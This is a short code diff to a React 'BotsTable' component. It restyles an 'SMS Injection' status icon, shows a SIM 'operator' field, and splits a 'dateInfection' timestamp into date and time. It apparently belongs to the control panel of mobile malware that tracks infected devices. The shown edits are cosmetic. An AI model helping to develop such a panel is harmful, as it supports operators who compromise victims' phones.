@@ -148,7 +148,7 @@ const BotsTable: React.FC = () => {
       html += renderToString(<MessageOutlined title='SMS Injection Triggered' className='!text-green-500' />)
     }
     else {
-      html += renderToString(<MessageOutlined title='SMS Injection not Triggered' className='!text-stone-500' />)
+      html += renderToString(<MessageOutlined title='SMS Injection not Triggered' className='!text-yellow-500' />)
     }
     html += ' ';
 
@@ -358,14 +358,15 @@ const BotsTable: React.FC = () => {
     },
     {
       title: 'Sim',
-      dataIndex: 'sim',
+      dataIndex: 'operator',
     },
     {
       title: 'DateTime',
       dataIndex: 'dateInfection',
       render: (date: string) => {
+        const dates = new Date(date).toLocaleString().split(',')
         return (
-          <div>{new Date(date).toLocaleDateString()}</div>
+          <div className='text-center'>{dates[0].trim()}<br/>{dates[1].trim()}</div>
         )
       }
     },
